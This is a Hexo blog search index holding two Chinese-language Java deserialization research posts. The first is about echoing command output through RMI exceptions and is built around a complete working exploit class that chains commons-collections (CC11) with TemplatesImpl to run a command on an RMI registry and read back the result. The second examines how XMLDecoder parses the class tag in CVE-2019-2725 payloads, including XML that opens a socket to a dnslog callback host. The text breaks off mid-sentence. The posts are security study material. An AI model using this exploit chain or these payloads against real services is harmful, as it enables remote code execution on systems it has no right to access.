<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>RMI 回显构造</title>
    <link href="/2023/09/04/RMI-%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/"/>
    <url>/2023/09/04/RMI-%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="分析构造"><a href="#分析构造" class="headerlink" title="分析构造"></a>分析构造</h1><p>RMI 客户端向服务端发起请求查询某个绑定的对象并调用其方法时，方法是在服务端执行然后将结果返回给客户端的，如果服务端执行的过程中出错，那么报错信息也会返回给客户端，所以利用返回报错信息的特点，将命令执行的结果通过报错信息返回，达到回显的目的</p><p>先看一个正常的，将一个对象绑定到 server 端，对其进行查询调用，这里对服务端进行 debug</p><p>发送给服务端的序列化数据，会在<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>方法中进行反序列化，不过 8u141 之前无法在该方法中下断点，可在<code>sun.rmi.registry.RegistryImpl#lookup</code>方法中下断点，因为在<code>RegistryImpl_Skel#dispatch</code>反序列化后，会调用<code>RegistryImpl</code>类中的相关方法（bind、rebind 也是同理）</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667863853-d31debe8-71e5-4f25-b6c2-8e558f5521da.png" alt="image.png"></p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667902499-8689e467-3a2f-4ec6-8d1c-b8436440d3ee.png" alt="image.png"></p><p>成功查询到对象，然后返回给客户端</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668022104-3c5fd138-b442-4a00-b08e-dfa380ddc38a.png" alt="image.png"></p><p>客户端再远程调用该对象的方法，在<code>sun.rmi.server.UnicastServerRef#dispatch</code>方法中通过反射调用</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668424004-5d93ae24-a1d4-497d-a58c-156e6eeb9f68.png" alt="image.png"></p><p>在<code>sun.rmi.server.UnicastRef#marshalValue</code>方法中将结果写入</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668464333-d0d16cc3-7a5b-4df4-abce-5cfb0ca4761f.png" alt="image.png"></p><p>在<code>sun.rmi.server.UnicastServerRef#dispatch</code>方法的最后将结果返回给客户端</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668539097-546d5b02-6e49-4058-b53a-b24cd7395da7.png" alt="image.png"></p><p>那么如果服务端在反序列化客户端发来的数据时，报错了会怎样，那么报错的信息依然会发送给客户端，在客户端查找一个注册表中不存在的名称</p><p>在<code>sun.rmi.registry.RegistryImpl#lookup</code>方法中会抛出异常</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693673499084-8ca36d23-b0bb-4375-891b-110ffd05df5c.png" alt="image.png"></p><p>这个异常会在<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>方法中被捕获，然后返回给客户端</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693673734215-4f0ddbea-756b-4863-b498-eb627a266e46.png" alt="image.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">lookup:</span><span class="hljs-number">166</span>, RegistryImpl (sun.rmi.registry)<br><span class="hljs-symbol">dispatch:</span><span class="hljs-number">-1</span>, RegistryImpl_Skel (sun.rmi.registry)<br><span class="hljs-symbol">oldDispatch:</span><span class="hljs-number">410</span>, UnicastServerRef (sun.rmi.server)<br><span class="hljs-symbol">dispatch:</span><span class="hljs-number">268</span>, UnicastServerRef (sun.rmi.server)<br><span class="hljs-symbol">run:</span><span class="hljs-number">178</span>, Transport<span class="hljs-number">$1</span> (sun.rmi.transport)<br><span class="hljs-symbol">run:</span><span class="hljs-number">175</span>, Transport<span class="hljs-number">$1</span> (sun.rmi.transport)<br><span class="hljs-symbol">doPrivileged:</span><span class="hljs-number">-1</span>, AccessController (java.security)<br><span class="hljs-symbol">serviceCall:</span><span class="hljs-number">174</span>, Transport (sun.rmi.transport)<br><span class="hljs-symbol">handleMessages:</span><span class="hljs-number">557</span>, TCPTransport (sun.rmi.transport.tcp)<br><span class="hljs-symbol">run0:</span><span class="hljs-number">812</span>, TCPTransport<span class="hljs-number">$ConnectionHandler</span> (sun.rmi.transport.tcp)<br><span class="hljs-symbol">run:</span><span class="hljs-number">671</span>, TCPTransport<span class="hljs-number">$ConnectionHandler</span> (sun.rmi.transport.tcp)<br><span class="hljs-symbol">runWorker:</span><span class="hljs-number">1142</span>, ThreadPoolExecutor (java.util.concurrent)<br><span class="hljs-symbol">run:</span><span class="hljs-number">617</span>, ThreadPoolExecutor<span class="hljs-number">$Worker</span> (java.util.concurrent)<br><span class="hljs-symbol">run:</span><span class="hljs-number">745</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>通过构造恶意的反序列化链，将命令执行的结果放在异常中并抛出，这里使用 CC11</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRMI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;dddd&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Process proc = Runtime.getRuntime().exec(\&quot;hostname\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));&quot;</span> +<br>                <span class="hljs-string">&quot;        StringBuffer sb = new StringBuffer();&quot;</span> +<br>                <span class="hljs-string">&quot;        String line;&quot;</span> +<br>                <span class="hljs-string">&quot;        while ((line = br.readLine()) != null)&quot;</span> +<br>                <span class="hljs-string">&quot;        &#123;&quot;</span> +<br>                <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;        String result = \&quot;result: \&quot; + sb.toString();&quot;</span> +<br>                <span class="hljs-string">&quot;throw new java.lang.InstantiationException(result);&quot;</span>;<br>        <br>        cc.makeClassInitializer().insertAfter(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rce&quot;</span> + System.nanoTime();<br>        cc.setName(randomName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[] classBytes = cc.toBytecode();<br>        classBytes[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>        classBytes[<span class="hljs-number">7</span>] = <span class="hljs-number">50</span>;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">impl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(impl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;);<br>        setFieldValue(impl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;testTemplatesImpl&quot;</span>);<br>        setFieldValue(impl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;asdfasdfasdf&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(innermap, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map, impl);<br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashset</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashset.add(<span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashset_map</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            hashset_map = (HashMap) getFieldObject(HashSet.class, <span class="hljs-string">&quot;map&quot;</span>, hashset).get(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            hashset_map = (HashMap) getFieldObject(HashSet.class, <span class="hljs-string">&quot;backingMap&quot;</span>, hashset).get(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        Object[] array = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            array = (Object[]) getFieldObject(HashMap.class, <span class="hljs-string">&quot;table&quot;</span>, hashset_map).get(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            array = (Object[]) getFieldObject(HashMap.class, <span class="hljs-string">&quot;elementData&quot;</span>, hashset_map).get(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) &#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-literal">true</span>);<br>        keyField.set(node, tiedmap);<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> createMap(<span class="hljs-string">&quot;asdffq&quot;</span>, hashset);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map1);<br><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(<br>                Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler));<br>        <span class="hljs-keyword">try</span> &#123;<br>            registry.bind(<span class="hljs-string">&quot;cmd&quot;</span>, remote);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">pw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(sw);<br><br>            <span class="hljs-comment">// 将错误信息输出到 PrintWriter 对象中</span><br>            e.printStackTrace(pw);<br><br>            <span class="hljs-comment">// 将错误堆栈信息转换为字符串</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">stackTrace</span> <span class="hljs-operator">=</span> sw.toString();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">indexString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Caused by: java.lang.InstantiationException: result: &quot;</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> stackTrace.indexOf(indexString);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> stackTrace.lastIndexOf(<span class="hljs-string">&quot;at&quot;</span>);<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">exceptionDetails</span> <span class="hljs-operator">=</span> stackTrace.substring(index + indexString.length(), end);<br><br>            System.out.println(exceptionDetails);<br>        &#125;<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldname, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldname);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List <span class="hljs-title function_">getFieldObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object object)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        list.add(field.get(object));<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title function_">createMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key, <span class="hljs-keyword">final</span> Object val)</span> &#123;<br>        <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map.put(key, val);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">RMI反序列化</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XMLDecoder 反序列化之 class 标签</title>
    <link href="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/"/>
    <url>/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<p>在学习 CVE-2019-2725 时看到文章中说构造的 xml 需要在一行才能成功</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.dnslog.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么为什么需要这样构造呢，这跟<code>calss</code>标签特性有关，我们先来看下在 class 开始标签与 string 开始标签之间换行会怎样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样使用 XMLDecoder 反序列化时会报错找不到这个类</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/1.png" class=""><p>跟踪调试，在解析 class 标签后，会调用<code>com.sun.beans.decoder.DocumentHandler#characters</code>方法，来添加标签中的字符数据</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/2.png" class=""><p>可以看到这里将换行符和空格添加了进去(因为 xml 换行时编辑器会自动进行缩进，所以带了空格，如果把缩进删除，则只添加换行)</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/3.png" class=""><p>解析 string 闭合标签时，会进入<code>com.sun.beans.decoder.ElementHandler#endElement</code>方法中</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/4.png" class=""><p>append 之后就变成了<code>\n    java.net.Socket</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/5.png" class=""><p>在解析 void 闭合标签时，会进入到<code>com.sun.beans.decoder.ObjectElementHandler#getValueObject</code>方法，跟进<code>getContextBean()</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/6.png" class=""><p>最终会来到<code>com.sun.beans.decoder.ClassElementHandler#getValue</code>方法中，可以很清晰看出为什么会报ClassNotFoundException</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/7.png" class=""><p>那么如果改成如下这样呢？</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依然会报找不到类的错误</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/8.png" class=""><p>只要保证如下这样就可以了，因为 class 标签只会将其标签下的字符和其直接 string 子标签中的字符添加到与之对应的<code>this.sb</code>中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那为什么包含类的 string 